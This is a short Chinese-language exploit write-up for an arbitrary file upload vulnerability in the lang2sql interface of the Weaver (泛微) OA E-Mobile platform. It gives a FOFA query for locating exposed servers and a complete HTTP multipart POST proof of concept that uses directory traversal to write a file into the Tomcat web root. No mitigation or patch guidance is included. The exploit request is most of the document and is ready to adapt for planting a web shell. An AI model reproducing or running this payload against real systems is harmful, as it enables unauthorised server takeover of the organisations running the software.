## 泛微OA-E-Mobile移动管理平台lang2sql任意文件上传漏洞

>    泛微OA E-Mobile 移动管理平台 lang2sql 接口存在任意文件上传漏洞，攻击者可通过该漏洞上传任意文件从而控制整个服务器。

## fofa

```
product="泛微-EMobile"
```

## poc

```
POST /emp/lang2sql?client_type=1&lang_tag=1 HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36
Content-Length: 265
Content-Type: multipart/form-data; boundary=00content0boundary00
Sl-Ce-Suid: 15
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip, deflate, br
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="source"


--00content0boundary00
Content-Disposition: form-data; name="file"; filename="../../../../appsvr/tomcat/webapps/ROOT/lGMXG.txt"

qNZGimiejDiiR5HKHubtm3Ib5WeWUnM6
--00content0boundary00--
```

![image-20240602201513765](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406022015812.png)

![image-20240602201522994](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406022015032.png)